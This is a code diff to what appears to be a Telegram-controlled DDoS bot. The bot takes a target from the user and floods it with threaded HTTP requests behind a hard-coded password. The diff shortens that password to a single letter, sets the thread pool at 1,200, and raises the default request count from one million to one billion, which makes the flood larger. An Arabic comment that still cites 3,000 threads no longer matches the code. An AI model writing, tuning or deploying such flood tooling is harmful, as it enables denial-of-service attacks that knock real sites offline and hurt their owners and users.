@@ -24,7 +24,7 @@ def password_prompt(chat_id):
 
 def check_password(message):
     password = message.text
-    if password == "junai":
+    if password == "j":
         bot.send_message(message.chat.id, Fore.GREEN + "Correct password! Opening attack menu 0x7F6AD9F14371C6FB9678CA77..." + Style.RESET_ALL)
         start_attack(message.chat.id)
     else:
@@ -40,7 +40,7 @@ def send_requests_threaded(target, request_count, stop_flag):
         except requests.exceptions.RequestException:
             pass
 
-    num_threads = 1500  # استخدام 3000 خيط كحد أقصى
+    num_threads = 1200  # استخدام 3000 خيط كحد أقصى
 
     with ThreadPoolExecutor(max_workers=num_threads) as executor:
         futures = [executor.submit(send_request) for _ in range(int(request_count))]
@@ -61,7 +61,7 @@ def start_attack(chat_id):
 
 def get_target_details(message):
     target = message.text
-    request_count = 1000000
+    request_count = 1000000000
     msg = bot.send_message(message.chat.id, "Attack Duration (seconds):")
     bot.register_next_step_handler(msg, execute_attack, target, request_count)
 
